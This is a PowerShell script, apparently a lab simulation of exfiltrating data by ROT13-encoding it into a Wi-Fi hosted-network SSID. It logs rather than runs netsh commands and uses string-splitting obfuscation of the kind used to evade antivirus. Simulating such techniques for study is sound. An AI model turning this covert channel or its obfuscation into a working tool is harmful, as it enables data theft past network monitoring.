Function Invoke-SSIDExfil {
    [CmdletBinding()]
    Param(
        [switch]$ExfilOnly , 
        [switch]$Decode , 
        [String]$StringToExfiltrate , 
        [String]$StringToDecode 
    )

    Function ConvertTo-ROT13 {
        Param([String]$InputString )

        $builder = New-Object System.Text.StringBuilder
        ForEach ($char In $InputString.("{2}{0}{1}{3}" -f 'ha' , 'rAr' , 'ToC' , 'ray')."invokE"()) {
            $code = [int][Char]$char 
            Switch ($code ) {
                {
                    $_ -ge 65 -And $_ -le 90 }
                {
                    [Void]$builder."aPpenD"([Char]((($_ - 65 + 13) % 26) + 65))
                    Continue 
                }
                {
                    $_ -ge 97 -And $_ -le 122 }
                {
                    [Void]$builder."aPpeND"([Char]((($_ - 97 + 13) % 26) + 97))
                    Continue 
                }
                default {
                    [Void]$builder.("{0}{1}" -f 'Appe' , 'nd')."INVOKE"($char )
                }
            }
        }

        Return $builder.("{2}{1}{0}" -f 'String' , 'o' , 'T')."INvOKE"()
    }

    $artifactDir = Join-Path $PSScriptRoot "artifacts\ssid-exfil"
    If ( -Not (Test-Path $artifactDir )) {
        $Null = New-Item -ItemType Directory -Path $artifactDir -Force
    }

    If ($Decode ) {
        $decoded = convertto-rot13 -inputstring $StringToDecode 
        Write-Output "[safe] Decoded value: $decoded"
        Return 
    }

    If ($ExfilOnly ) {
        $plainText = $StringToExfiltrate 
    }
    Else {
        $plainText = "LAB:alice:hello"
    }

    If ([String]::("{1}{0}{3}{2}" -f 'llOrWh' , 'IsNu' , 'Space' , 'ite')."INvoke"($plainText )) {
        Throw "StringToExfiltrate cannot be empty."
    }

    If ($plainText."lENGTh" -gt 32) {
        Throw "The simulated SSID payload must be 32 characters or fewer."
    }

    $ssidName = convertto-rot13 -inputstring $plainText 
    $logPath = Join-Path $artifactDir "ssid-actions.txt"
    $commands = @(
        "[safe] Would run: netsh wlan set hostednetwork mode=allow ssid=""$ssidName"" key='HardtoGuess!@#123'" , 
        "[safe] Would run: netsh wlan start hostednetwork" , 
        "[safe] Plaintext source: $plainText" , 
        "[safe] ROT13 SSID: $ssidName"
    )

    Set-Content -Path $logPath -Value $commands -Encoding UTF8

    Write-Output "[safe] Simulated SSID exfiltration value: $ssidName"
    Write-Output "[safe] Actions logged to $logPath"
}

invoke-ssidexfil -exfilonly -stringtoexfiltrate "LAB:alice:hello"
